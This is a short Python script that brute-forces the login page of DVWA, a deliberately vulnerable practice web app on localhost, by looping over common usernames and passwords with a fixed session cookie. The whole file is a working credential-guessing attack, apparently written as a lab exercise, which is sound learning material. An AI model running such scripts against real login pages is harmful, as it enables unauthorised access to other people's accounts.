import requests

url = "http://127.0.0.1/DVWA/vulnerabilities/brute/"

usrname = ["root", "admin", "test"]
passwords = ["password", "admin", "root", "test"]

cookie = {"PHPSESSID": "e54cljaacptac472uiko6en7id", "security": "low"}

# ?username=test&password=arun&Login=Login

for usr in usrname:
    for password in passwords:
        print(f"Trying username={usr} and password={password}")
        
        payload = f"?username={usr}&password={password}&Login=Login"
        
        r = requests.get(url + payload, cookies=cookie)
        
        print(r.status_code)

        if "Username and/or password incorrect" not in r.text:
            print(f">>Valid username: {usr} & password: {password}")
            bol = False
            exit()
        else:
            print(f"Invalid username: {usr} & password: {password}")
